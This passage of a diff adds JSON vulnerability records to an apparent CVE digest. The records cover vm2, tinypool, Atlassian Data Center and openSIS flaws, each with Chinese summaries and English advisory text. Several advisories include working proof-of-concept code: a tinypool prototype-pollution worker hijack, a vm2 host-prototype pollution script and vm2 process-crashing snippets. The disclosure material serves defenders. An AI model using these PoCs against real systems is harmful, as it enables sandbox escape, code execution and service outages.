`mod.path.startsWith(path)` logic in `isPathAllowedForModule` for a relative require from an allowlisted package. Its public fix is [commit `6ac3916da84e060c403e407b6b6318fcc66b0e72`](https://github.com/patriksimek/vm2/commit/6ac3916da84e060c403e407b6b6318fcc66b0e72), which adds a path-boundary check to `isPathAllowedForModule` while leaving the filename-side `this.externals` fallback unchanged. A related public resolver fix is [commit `ab4ee7d803e8c80155e9eb3672226bddbca4aa9c`](https://github.com/patriksimek/vm2/commit/ab4ee7d803e8c80155e9eb3672226bddbca4aa9c), which rejects `..` traversal in allowlisted subpaths and explicitly leaves the filename-side `this.externals` matcher untouched. This finding has a separate fix surface: the current `customResolve` function appends new raw-prefix regular expressions to `this.externals` at both custom-resolver return branches, which those public fixes do not describe or patch.\n\n[GHSA-c48m-32m9-vx93](https://github.com/patriksimek/vm2/security/advisories/GHSA-c48m-32m9-vx93), “vm2 Custom Module Resolver Can Bypass the External Package Allowlist by Loading a Colliding Host Package,” is the closest custom-resolver advisory. It fixes the specifier-side `externalCache` matcher and rejects `..` segments before the custom resolver is consulted. This finding reaches a different, residual branch after successful custom resolution: `customResolve` appends a filename-side raw-prefix regular expression to `this.externals`, allowing a prefix-sharing absolute sibling. Neither GHSA-c48m nor GHSA-7q3f patches that branch. Repository issue, pull-request, and commit history contains no matching fix for it. No patched version is claimed because only the pinned revision was tested.",
+      "references": [
+        {
+          "name": "GitHub Advisory",
+          "url": "https://github.com/advisories/GHSA-5h3f-q97h-ccvc"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-5h3f-q97h-ccvc"
+        },
+        {
+          "name": "參考",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100721"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/commit/6ac3916da84e060c403e407b6b6318fcc66b0e72"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/commit/91034466bfb7f56b95fd48083ec6ca36d058f164"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/commit/ab4ee7d803e8c80155e9eb3672226bddbca4aa9c"
+        }
+      ],
+      "affected_packages": [
+        "npm:vm2 (<= 3.12.1)"
+      ],
+      "published": "2026-10-05T23:24:29Z",
+      "modified": "2026-10-05T23:24:30Z",
+      "sources": [
+        "ghsa"
+      ],
+      "rank": 5,
+      "generated_by": "template",
+      "risk_score": 9.508
+    },
+    {
+      "cve_id": "CVE-2026-104849",
+      "title_short": "npm tinypool 104849×9.5",
+      "title_full": "npm tinypool CVE-2026-104849 · CVSS 9.5",
+      "vendor": "npm",
+      "product": "tinypool",
+      "vendor_advisory_id": "GHSA-85c8-ppgw-ccpr",
+      "severity": "CRITICAL",
+      "cvss": {
+        "version": "4.0",
+        "score": 9.5,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+      },
+      "epss": {
+        "score": 0.0039,
+        "percentile": 0.30722
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-1321"
+      ],
+      "tags": [
+        "RCE"
+      ],
+      "in_the_wild": false,
+      "kev": null,
+      "summary_zh": "npm tinypool 存在RCE漏洞，CVSS 9.5，EPSS 0.00。",
+      "impact_zh": "遠端程式碼執行，攻擊者可完全控制受影響系統。",
+      "action_zh": "優先更新至修補版本；無法更新者請限制邊界存取或停用該介面。",
+      "description_en": "`tinypool` is a fork of `piscina` and inherited the same prototype-pollution surface. When `pool.run(task, options)` is called, the `filename` option is read from the provided `options` object. If that object does not have an own `filename` property, the lookup falls through to `Object.prototype`.\n\nAn attacker who can pollute `Object.prototype.filename` (for example, via a vulnerable `lodash.merge`, `qs.parse`, or similar elsewhere in the application) can make tinypool load and execute an attacker-controlled worker module.\n\nThis is the tinypool counterpart to the piscina root discovery [GHSA-x9g3-xrwr-cwfg](https://github.com/piscinajs/piscina/security/advisories/GHSA-x9g3-xrwr-cwfg).\n\n`pool.run(task)` with no second argument is not affected, because `kDefaultOptions.filename` is `null` and the options object is not user-controlled. The exploit only triggers when the caller passes their own options object to `pool.run()`.\n\n## Impact\n\nArbitrary JavaScript execution in the worker pool. If the application passes attacker-controlled data as the `run()` task and also supplies a `run()` options object, the attacker can redirect execution to a malicious worker that exfiltrates or modifies that data, achieving remote code execution and/or data exfiltration.\n\n## Proof of Concept\n\n```js\n// legitimate-worker.mjs\nexport default async (task) => ({ by: 'legitimate-worker', processed: task })\n\n// malicious-worker.mjs\nexport default async (task) => ({ by: 'attacker', stolenRequestBody: task })\n\n// main.js\nimport express from \"express\";\nimport Tinypool from \"tinypool\";\nimport { fileURLToPath } from \"node:url\";\nimport path from \"node:path\";\n\nconst __dirname = path.dirname(fileURLToPath(import.meta.url));\n\n// Simulate upstream prototype pollution (lodash merge, qs parse, etc.)\nObject.prototype.filename = path.join(__dirname, \"malicious-worker.mjs\");\n\nconst pool = new Tinypool({\n  filename: path.join(__dirname, \"legitimate-worker.mjs\"),\n});\n\nexpress()\n  .use(express.json())\n  .post(\"/\", async (req, res) => {\n    const ac = new AbortController();\n    const result = await pool.run(req.body, { signal: ac.signal });\n    res.json(result);\n  })\n  .listen(31337);\n```\n\n## Suggested fix\n\nRead all user-supplied options from own properties only (`Object.hasOwn` or `Object.prototype.hasOwnProperty.call`) and build the internal `ThreadPool.options` object with a null prototype.",
+      "references": [
+        {
+          "name": "GitHub Advisory",
+          "url": "https://github.com/advisories/GHSA-85c8-ppgw-ccpr"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/tinylibs/tinypool/security/advisories/GHSA-85c8-ppgw-ccpr"
+        },
+        {
+          "name": "參考",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-104849"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/tinylibs/tinypool/pull/135"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/tinylibs/tinypool/commit/f41411a3e23324c674f35a19a3240f7a7c40ffbf"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/tinylibs/tinypool/releases/tag/v2.1.2"
+        }
+      ],
+      "affected_packages": [
+        "npm:tinypool (< 2.1.2)"
+      ],
+      "published": "2026-10-05T22:49:52Z",
+      "modified": "2026-10-05T22:49:53Z",
+      "sources": [
+        "ghsa"
+      ],
+      "rank": 6,
+      "generated_by": "template",
+      "risk_score": 9.508
+    },
+    {
+      "cve_id": "CVE-2026-92953",
+      "title_short": "npm vm2 92953×9.3",
+      "title_full": "npm vm2 CVE-2026-92953 · CVSS 9.3",
+      "vendor": "npm",
+      "product": "vm2",
+      "vendor_advisory_id": "GHSA-3vgf-8m4q-q4qr",
+      "severity": "CRITICAL",
+      "cvss": {
+        "version": "4.0",
+        "score": 9.3,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:H/SA:H"
+      },
+      "epss": {
+        "score": 0.00501,
+        "percentile": 0.40772
+      },
+      "cwe": [
+        "CWE-913",
+        "CWE-1321"
+      ],
+      "tags": [
+        "其他"
+      ],
+      "in_the_wild": false,
+      "kev": null,
+      "summary_zh": "npm vm2 存在安全漏洞，CVSS 9.3，EPSS 0.01。",
+      "impact_zh": "系統可能遭未授權存取或控制。",
+      "action_zh": "依廠商公告更新至最新修補版本；無法更新者請評估隔離或停用該服務。",
+      "description_en": "## Summary\n\nvm2's current host-intrinsic prototype protection is incomplete. The fix for `GHSA-vwrp-x96c-mhwq` blocks sandbox writes into classic host intrinsics such as `Object.prototype`, `Array.prototype`, and `Function.prototype`, but current head still lets sandbox code in a default `VM` reach and mutate host `Uint8Array.prototype`, `%TypedArray%.prototype`, and `ArrayBuffer.prototype`.\n\nAfter `VM.run()` returns, normal host typed-array and ArrayBuffer objects observe attacker-controlled properties and methods installed by the sandbox.\n\n## Technical Details\n\nThe existing mitigation relies on `protectedHostObjects` in `lib/bridge.js`. That set is populated from `otherGlobalPrototypes`, which is built from a fixed inventory of classic globals:\n\n```js\nconst globalsList = [\n  'Number', 'String', 'Boolean', 'Date', 'RegExp', 'Map', 'WeakMap',\n  'Set', 'WeakSet', 'Promise', 'Function'\n];\n```\n\nThe inventory omits typed-array and ArrayBuffer intrinsics. Sandbox code can still reuse the host-prototype walking primitive from the prior public advisory:\n\n```js\nconst lookupGetter = ({}).__lookupGetter__;\nconst apply = Buffer.apply;\nconst protoGetter = apply.apply(lookupGetter, [Buffer, ['__proto__']]);\nconst hostBuffer = Buffer.from([1]);\n\nconst hostBufferPrototype = protoGetter.call(hostBuffer);\nconst hostUint8ArrayPrototype = protoGetter.call(hostBufferPrototype);\nconst hostTypedArrayPrototype = protoGetter.call(hostUint8ArrayPrototype);\nconst hostArrayBufferPrototype = protoGetter.call(hostBuffer.buffer);\n```\n\nThose objects are not sandbox-local. Inside the sandbox, `hostUint8ArrayPrototype === Uint8Array.prototype`, `hostTypedArrayPrototype === Object.getPrototypeOf(Uint8Array.prototype)`, and `hostArrayBufferPrototype === ArrayBuffer.prototype` are all false. Because the objects are not in `protectedHostObjects`, bridge `defineProperty` writes are forwarded into the real host objects.\n\nThis is the same guard-coverage boundary as the previous host-intrinsic prototype pollution fix, but with a missing intrinsic family. The bridge already has the correct enforcement shape; the protected inventory is too narrow.\n\n## PoC\n\nPoV: `poc/pov-host-typedarray-arraybuffer-prototype-pollution.js`\n\nCurrent-head output:\n\n```json\n{\n  \"status\": \"completed\",\n  \"vulnerable\": true,\n  \"node\": \"v25.8.0\",\n  \"v8\": \"14.1.146.11-node.20\",\n  \"control\": {\n    \"defineResult\": true,\n    \"sandboxReadsBack\": \"sandbox-only\",\n    \"hostControlAfter\": null\n  },\n  \"exploit\": {\n    \"hostUint8IsSandboxUint8\": false,\n    \"hostTypedArrayIsSandboxTypedArray\": false,\n    \"hostArrayBufferIsSandboxArrayBuffer\": false,\n    \"defineUint8\": true,\n    \"defineTypedArray\": true,\n    \"defineArrayBuffer\": true,\n    \"defineMethod\": true\n  },\n  \"hostEffect\": {\n    \"uint8Marker\": \"polluted-host-uint8array-prototype\",\n    \"typedArrayMarker\": \"polluted-host-typedarray-prototype\",\n    \"arrayBufferMarker\": \"polluted-host-arraybuffer-prototype\",\n    \"methodReturn\": \"sandbox-method-reached-host-uint8array\"\n  }\n}\n```\n\nThe control proves sandbox-local `Uint8Array.prototype` writes remain sandbox-local. The exploit path reaches host prototypes through the bridge and causes host-created objects to observe sandbox-installed properties after `VM.run()` returns.\n\n## Impact\n\nThis is a sandbox boundary violation and host intrinsic prototype pollution. An attacker who can run JavaScript in a default vm2 `VM` can mutate shared host typed-array and ArrayBuffer behavior without `NodeVM`, `require`, wildcard builtins, `nesting: true`, or any host-provided typed-array object.\n\nThe supplied PoV demonstrates integrity and availability impact by installing markers and a method on host prototypes:\n\n- `Uint8Array.prototype`\n- `%TypedArray%.prototype`, which affects typed-array families through the shared typed-array prototype chain\n- `ArrayBuffer.prototype`\n\nThe PoV does not claim direct host command execution or direct confidentiality impact. It is local-only and restores touched descriptors before exit.\n\n## Suggested Fix\n\nExtend the protected host-object inventory and identity/prototype mappings to typed-array and binary-data intrinsics, including at least:\n\n- `%TypedArray%.prototype`\n- `ArrayBuffer.prototype`\n- `SharedArrayBuffer.prototype` when present\n- `DataView.prototype`\n- all concrete typed-array prototypes present in the runtime, including `Uint8Array.prototype`, `Uint8ClampedArray.prototype`, `Int8Array.prototype`, `Uint16Array.prototype`, `Int16Array.prototype`, `Uint32Array.prototype`, `Int32Array.prototype`, `Float16Array.prototype` when present, `Float32Array.prototype`, `Float64Array.prototype`, `BigInt64Array.prototype`, and `BigUint64Array.prototype`\n\nA temporary patched-control that added this intrinsic family to `thisGlobalPrototypes` caused the same PoV's `Reflect.defineProperty()` calls to throw `VMError: Operation not allowed on contextified object`, and no host markers were installed.\n\nThe fix should cover the same host mutation traps used by the existing host-intrinsic protection: `set`, `defineProperty`, `deleteProperty`, and `preventExtensions`. It should not special-case `Buffer`; `Buffer` is only one way to reach the omitted host prototypes.\n\n## Affected Package/Versions\n\nConfirmed on current head `7a1f5100b96f48d34e0fe104ab37c0acc5944f92` / `v3.11.5` with Node `v25.8.0` / V8 `14.1.146.11-node.20`.\n\nConfirmed affected after the prior patch: `npm:vm2 >= 3.11.0, <= 3.11.5`.\n\nLocal sweep also reproduces on `v3.10.0` through `v3.10.5`, but that range overlaps the already-published `GHSA-vwrp-x96c-mhwq` range. `v3.9.0` through `v3.9.2` did not produce host-visible pollution in the same local test.\n\n## Why This Is Not Intended Behavior\n\nvm2 documents `VM` as a sandbox for untrusted code without `require`, with only JavaScript built-ins and Node's `Buffer` available by default. The known escape hatches do not explain this issue:\n\n- `require.builtin: ['*']` is a `NodeVM` configuration; this PoV uses default `VM`.\n- `nesting: true` is not enabled or used.\n- The README timeout caveat covers host code operating on objects returned from the sandbox; this PoV mutates host intrinsics and later affects ordinary host-created typed arrays and ArrayBuffers.\n\nThe project's own attack notes state that host-realm intrinsic prototypes should be protected from sandbox writes, while non-intrinsic host objects may remain mutable when intentionally exposed. Typed-array and ArrayBuffer prototypes are host intrinsics, not embedder-owned application objects.\n\n`Buffer` availability explains how the PoV reaches the host prototype chain, but it does not authorize mutation of unrelated host-realm intrinsics. The host effects are observed on new host-created typed arrays and ArrayBuffers after `VM.run()` returns; the host is not invoking an object returned from the sandbox.",
+      "references": [
+        {
+          "name": "GitHub Advisory",
+          "url": "https://github.com/advisories/GHSA-3vgf-8m4q-q4qr"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-3vgf-8m4q-q4qr"
+        },
+        {
+          "name": "參考",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-92953"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/commit/92a10fca7b3ca63bb1574b6795540264f6805b30"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.8"
+        },
+        {
+          "name": "參考",
+          "url": "https://www.vulncheck.com/advisories/vm2-3.11.0-through-3.11.7-prototype-pollution-via-typedarray"
+        }
+      ],
+      "affected_packages": [
+        "npm:vm2 (>= 3.11.0, <= 3.11.7)"
+      ],
+      "published": "2026-10-05T22:45:22Z",
+      "modified": "2026-10-05T22:45:24Z",
+      "sources": [
+        "ghsa"
+      ],
+      "rank": 7,
+      "generated_by": "template",
+      "risk_score": 9.31
+    },
+    {
+      "cve_id": "CVE-2026-21589",
+      "title_short": "未標示產品 21589×9.3",
+      "title_full": "未標示產品 CVE-2026-21589 · CVSS 9.3",
+      "vendor": "",
+      "product": "",
+      "vendor_advisory_id": "GHSA-gr66-x5pq-8g2g",
+      "severity": "CRITICAL",
+      "cvss": {
+        "version": "4.0",
+        "score": 9.3,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X"
+      },
+      "epss": null,
+      "cwe": [],
+      "tags": [
+        "其他"
+      ],
+      "in_the_wild": false,
+      "kev": null,
+      "summary_zh": "未標示產品 存在安全漏洞，CVSS 9.3。",
+      "impact_zh": "系統可能遭未授權存取或控制。",
+      "action_zh": "依廠商公告更新至最新修補版本；無法更新者請評估隔離或停用該服務。",
+      "description_en": "h3. Summary\n\nThis is a vulnerability in Bitbucket Data Center, Confluence Data Center, Jira Service Management Data Center, Jira Software Data Center, Bamboo Data Center. Crowd Data Center, Crucible and Fisheye. This Arbitrary File Access vulnerability allows an unauthenticated attacker to access specific files within the web application root directory in affected versions. Exploitation requires prior knowledge of the target file's exact name and path; this vulnerability does not allow attackers to enumerate or list directory contents. In some configurations, there may be some sensitive files that make this highly severe.  \n\nh3. Context\n\nThis vulnerability allows an unauthenticated remote attacker to access specific files within the web application root directory in affected versions.\n\nh3. Details:\n\n* The vulnerability must be addressed for affected versions of:\n Bitbucket Data Center, introduced in version >= 4.6.0, fix versions: 9.4.26, 10.2.8, 10.5.1\n Confluence Data Center, introduced in version >= 5.10.0, fix versions 9.2.26, 10.2.19\n Crowd Data Center, introduced in version >= 2.11.0, fix versions 6.3.7, 7.0.3, 7.1.1, 7.2.4\n Jira Software Data Center, introduced in version >= 7.1.0, fix versions 9.12.40, 10.3.26, 11.3.12\n Jira Service Management Data Center, introduced in version >= 3.1.0, fix versions 5.12.40, 10.3.26, 11.3.12\n Bamboo Data Center >= 7.0.1, fix versions 10.2.24, 12.1.12\n Crucible, fix versions 4.9.15\n Fisheye, fix version 4.9.15\n* Exploitation requires prior knowledge of the target file's exact name and path.\n* The vulnerability does not include the capability to enumerate or list directory contents.",
+      "references": [
+        {
+          "name": "參考",
+          "url": "https://jira.atlassian.com/browse/BAM-26567"
+        },
+        {
+          "name": "參考",
+          "url": "https://jira.atlassian.com/browse/BSERV-20604"
+        },
+        {
+          "name": "參考",
+          "url": "https://jira.atlassian.com/browse/CONFSERVER-104488"
+        },
+        {
+          "name": "參考",
+          "url": "https://jira.atlassian.com/browse/CRUC-8741"
+        },
+        {
+          "name": "參考",
+          "url": "https://jira.atlassian.com/browse/CWD-6610"
+        },
+        {
+          "name": "參考",
+          "url": "https://jira.atlassian.com/browse/FE-7583"
+        },
+        {
+          "name": "GitHub Advisory",
+          "url": "https://github.com/advisories/GHSA-gr66-x5pq-8g2g"
+        },
+        {
+          "name": "參考",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-21589"
+        }
+      ],
+      "affected_packages": [],
+      "published": "2026-10-05T22:16:58Z",
+      "modified": "2026-10-06T00:32:54Z",
+      "sources": [
+        "nvd",
+        "ghsa"
+      ],
+      "rank": 8,
+      "generated_by": "template",
+      "risk_score": 9.3
+    },
+    {
+      "cve_id": "CVE-2026-91107",
+      "title_short": "未標示產品 91107×9.3",
+      "title_full": "未標示產品 CVE-2026-91107 · CVSS 9.3",
+      "vendor": "",
+      "product": "",
+      "vendor_advisory_id": "GHSA-r588-8qfc-26mv",
+      "severity": "CRITICAL",
+      "cvss": {
+        "version": "4.0",
+        "score": 9.3,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X"
+      },
+      "epss": null,
+      "cwe": [
+        "CWE-639"
+      ],
+      "tags": [
+        "其他"
+      ],
+      "in_the_wild": false,
+      "kev": null,
+      "summary_zh": "未標示產品 存在安全漏洞，CVSS 9.3。",
+      "impact_zh": "系統可能遭未授權存取或控制。",
+      "action_zh": "依廠商公告更新至最新修補版本；無法更新者請評估隔離或停用該服務。",
+      "description_en": "openSIS Classic 9.3 allows an authenticated user with the built-in teacher role can select an arbitrary staff record through staff_id and cause the School Information update path to reset that selected account's password.",
+      "references": [
+        {
+          "name": "參考",
+          "url": "https://fluidattacks.com/advisories/hearts"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/OS4ED/openSIS-Classic"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/OS4ED/openSIS-Classic/commit/24bb530391a67c114cd4fe3dff65da7e070f5ed1"
+        },
+        {
+          "name": "GitHub Advisory",
+          "url": "https://github.com/advisories/GHSA-r588-8qfc-26mv"
+        },
+        {
+          "name": "參考",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-91107"
+        }
+      ],
+      "affected_packages": [],
+      "published": "2026-10-05T22:16:58Z",
+      "modified": "2026-10-06T00:32:55Z",
+      "sources": [
+        "nvd",
+        "ghsa"
+      ],
+      "rank": 9,
+      "generated_by": "template",
+      "risk_score": 9.3
+    },
+    {
+      "cve_id": "CVE-2026-92954",
+      "title_short": "npm vm2 92954×9.2",
+      "title_full": "npm vm2 CVE-2026-92954 · CVSS 9.2",
+      "vendor": "npm",
+      "product": "vm2",
+      "vendor_advisory_id": "GHSA-gjq8-xm47-88rc",
+      "severity": "CRITICAL",
+      "cvss": {
+        "version": "4.0",
+        "score": 9.2,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H"
+      },
+      "epss": {
+        "score": 0.00488,
+        "percentile": 0.39838
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-703"
+      ],
+      "tags": [
+        "其他"
+      ],
+      "in_the_wild": false,
+      "kev": null,
+      "summary_zh": "npm vm2 存在安全漏洞，CVSS 9.2，EPSS 0.00。",
+      "impact_zh": "系統可能遭未授權存取或控制。",
+      "action_zh": "依廠商公告更新至最新修補版本；無法更新者請評估隔離或停用該服務。",
+      "description_en": "## Summary\n\nvm2 current head (`v3.11.5`, commit `7a1f5100b96f48d34e0fe104ab37c0acc5944f92`) can still be used to terminate the host Node.js process when sandbox code calls a host-realm function that returns a rejected host Promise and then ignores the returned value.\n\nThis is an incomplete-fix variant of the `GHSA-hw58-p9xv-2mjh` unhandled rejection hardening. The `localPromise` constructor now catches and consumes sandbox-created unhandled rejections, but host Promises returned across the bridge are not marked handled at the bridge boundary. If the sandbox does not attach `.catch()` or `.then(..., onRejected)`, Node's default unhandled rejection behavior terminates the host process.\n\n## Technical Details\n\n`lib/setup-sandbox.js` hardens sandbox-created Promises by wrapping the executor and attaching a benign swallow tail:\n\n```js\napply(globalPromisePrototypeThen, this, [undefined, localPromiseSwallow]);\n```\n\nThat only applies to `localPromise` instances created inside the sandbox.\n\nHost-returned Promises cross the membrane through the bridge apply path. The bridge wraps callbacks when sandbox code later calls `.then`, `.catch`, or `.finally` on a host Promise:\n\n```js\nbridge.setHostPromiseSanitizers(e => handleException(from(e)), from);\n```\n\nHowever, if sandbox code ignores the returned host Promise, no host-side rejection handler is attached. The original host Promise remains unhandled and Node terminates the host process under the default unhandled-rejection behavior.\n\n`NodeVM` provides an in-repository example of this primitive through the special `events` builtin wrapper. `lib/builtin.js` passes host `EventEmitter.once` into the sandbox:\n\n```js\nonce: EventEmitter.once,\n```\n\nThen `lib/events.js` re-exports it:\n\n```js\nif (host.once) module.exports.once = host.once;\n```\n\nCalling `events.once(ee, 'message')` and then emitting `error` on `ee` returns a rejected host Promise through that wrapper. If ignored by sandbox code, it terminates the host process.\n\n## Impact\n\nAn attacker who can run code in a vm2 sandbox can terminate the host Node.js process when the embedder exposes a host Promise-returning API, or when a `NodeVM` permits the `events` builtin.\n\nFor web services, queues, notebook workers, plugin hosts, and multi-tenant code execution systems, a single small request can terminate the worker process. Restart policies do not fully mitigate the issue because the payload can be replayed after each restart.\n\n## Affected Package/Versions\n\nConfirmed affected on Node.js `v25.8.0`:\n\n- `v3.10.0`\n- `v3.10.1`\n- `v3.10.2`\n- `v3.10.3`\n- `v3.10.4`\n- `v3.10.5`\n- `v3.11.0`\n- `v3.11.1`\n- `v3.11.2`\n- `v3.11.3`\n- `v3.11.4`\n- `v3.11.5` / current head `7a1f5100b96f48d34e0fe104ab37c0acc5944f92`\n\nThe final PoV was also reproduced on current head with Node.js `v16.20.2`, `v18.20.8`, `v20.20.2`, `v22.22.3`, `v24.16.0`, and `v25.9.0` using `npx node@<major>`. The local workstation default Node.js `v25.8.0` also reproduces.\n\n\n## Configuration Required\n\nThe general VM PoV requires an embedder-exposed host function that can return a rejected host Promise:\n\n```js\nconst vm = new VM({\n  sandbox: {\n    hostReject: () => Promise.reject(new Error('host-boom')),\n  },\n});\n```\n\nThe NodeVM variant requires `events` in the builtin allowlist:\n\n```js\nnew NodeVM({ require: { external: false, builtin: ['events'] } });\n```\n\n`events.once()` is exposed by vm2's special `events` builtin wrapper. Node's official API documents `events.once()` as returning a Promise that rejects when the watched emitter emits `error` while waiting for another event.\n\n## Controls\n\n- If sandbox code attaches `.catch(() => {})` to the returned host Promise, the process survives.\n- If sandbox code creates and ignores a sandbox-native rejected Promise, the process survives on current head. This confirms the `GHSA-hw58` localPromise hardening is active.\n- If sandbox code attaches `.catch(() => {})` to the `events.once()` Promise, the `NodeVM` process survives.\n- If `NodeVM` does not allow the `events` builtin, the `events.once()` variant does not run and the process survives.\n\n## Disclosure Policy Fit\n\nvm2's security policy asks reporters not to open public issues and to submit This report is intended for that private route and includes the requested reproduction steps, affected versions, environment/configuration details, and impact. The affected range is within the supported `3.x` line.\n\n## Local Proof of Concept\n\nRun from the `oss-zero-day-harness` directory:\n\n```fish\nnode submission-bundle/vm2-pov-test-host-promise-return-unhandled-rejection-dos/pov-host-promise-return-unhandled-rejection-dos.js\n```\n\nThe crash-safe PoV executes each case in a child process. A vulnerable result has `status: 1` for the positive cases and `status: 0` for controls.\n\nMinimal VM positive case:\n\n```js\nconst { VM } = require('vm2');\n\nconst vm = new VM({\n  sandbox: {\n    hostReject: () => Promise.reject(new Error('host-boom')),\n  },\n});\n\nvm.run('hostReject(); 1');\nsetTimeout(() => console.log('survived'), 150);\n```\n\nObserved on current head:\n\n```text\nError: host-boom\n    at hostReject (...)\n```\n\nThe process exits before printing `survived`.\n\nMinimal NodeVM builtin variant:\n\n```js\nconst { NodeVM } = require('vm2');\n\nconst vm = new NodeVM({\n  require: { external: false, builtin: ['events'] },\n});\n\nvm.run(`\n  const events = require('events');\n  const ee = new events.EventEmitter();\n  events.once(ee, 'message');\n  ee.emit('error', new Error('event-boom'));\n  module.exports = 'returned';\n`, 'events-pov.js');\n\nsetTimeout(() => console.log('survived'), 150);\n```\n\nObserved on current head:\n\n```text\nnode:internal/process/promises:332\n    triggerUncaughtException(err, true /* fromPromise */);\nError: event-boom\n```\n\nThe process exits with status `1`.\n\n## Mitigation\n\nApplications can reduce exposure by installing a process-level `unhandledRejection` handler that swallows vm2-originated rejections, as the README recommends for related async rejection caveats. That is an application workaround, not a library-level fix: without such a handler, current Node's default `--unhandled-rejections=throw` behavior raises the rejection as an uncaught exception and exits the process.\n\n## Suggested Fix Direction\n\nWhen a host function call returns a host-realm Promise across the bridge into sandbox code, attach a benign host-side rejection handler to the raw returned Promise before wrapping it for the sandbox. This should mark the original host Promise handled without changing the value returned to sandbox code or hiding the rejection from sandbox code that later attaches its own `.catch()` / `.then(..., onRejected)`.\n\nRegression tests should cover:\n\n- `VM` with `hostReject: () => Promise.reject(new Error(...))`; calling `hostReject()` without `.catch()` must not terminate the process.\n- The same call with a sandbox `.catch()` must still deliver a sanitized rejection to the sandbox callback.\n- `NodeVM` with `require.builtin: ['events']`; calling `events.once(ee, 'message')` and then emitting `error` without `.catch()` must not terminate the process.\n- The same `events.once()` call with a sandbox `.catch()` must continue to deliver a sanitized rejection to the sandbox callback.\n- Sandbox-created rejected Promises should continue to be consumed by the existing localPromise hardening.\n\n## Why This Is Not Intended Behavior\n\nvm2 already treats this failure mode as security-relevant. `GHSA-hw58-p9xv-2mjh` was assigned High severity for a sandbox-created unhandled rejection that terminated the host process, and current `setup-sandbox.js` explicitly states that the local Promise swallow tail exists so the host's `unhandledRejection` event never fires.\n\nThis report shows the same availability boundary failure still exists for host-returned Promises:\n\n- the sandbox does not need `child_process`, filesystem, network, `nesting`, or dangerous builtins;\n- the `VM` variant needs only a common embedder pattern: exposing an async host helper to untrusted code;\n- the `NodeVM` variant needs only the documented `events` builtin allowlist;\n- a single sandbox call terminates the whole host process serving all users.\n\nThis is distinct from the documented caveat that `timeout` cannot stop CPU loops. It is also distinct from the README's current async-function / `await using` caveat: this report does not require sandbox `async` syntax, async functions, disposable stacks, or V8 stack-formatting behavior. The issue is specifically that vm2's own bridge returns a host Promise to the sandbox without marking the host Promise handled, while the sandbox-created Promise path does mark rejections handled.\n\nThis is also distinct from host-Promise callback sanitizer escapes. In those chains, sandbox code attaches a callback to a host Promise and then receives or returns a mis-sanitized value. Here, no sandbox Promise callback is required at all; the original host Promise is simply left orphaned after crossing the bridge.",
+      "references": [
+        {
+          "name": "GitHub Advisory",
+          "url": "https://github.com/advisories/GHSA-gjq8-xm47-88rc"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-gjq8-xm47-88rc"
+        },
+        {
+          "name": "參考",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-92954"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/commit/5bb37f8b3f0498675a71cfa4df2b408d8ef7d4fb"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.8"
+        },
+        {
+          "name": "參考",
+          "url": "https://www.vulncheck.com/advisories/vm2-3.10.0-through-3.11.5-denial-of-service-via-host-promise"
+        }
+      ],
+      "affected_packages": [
+        "npm:vm2 (>= 3.10.0, <= 3.11.7)"
+      ],
+      "published": "2026-10-05T22:45:48Z",
+      "modified": "2026-10-05T22:45:49Z",
+      "sources": [
+        "ghsa"
+      ],
+      "rank": 10,
+      "generated_by": "template",
+      "risk_score": 9.21
+    },
+    {
+      "cve_id": "CVE-2026-102828",
+      "title_short": "npm simple-git 102828×9.2",
+      "title_full": "npm simple-git CVE-2026-102828 · CVSS 9.2",
+      "vendor": "npm",
+      "product": "simple-git",
+      "vendor_advisory_id": "GHSA-x6jw-m9v5-85vh",
+      "severity": "CRITICAL",
+      "cvss": {
+        "version": "4.0",
+        "score": 9.2,
+        "vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      },
+      "epss": {
+        "score": 0.00275,
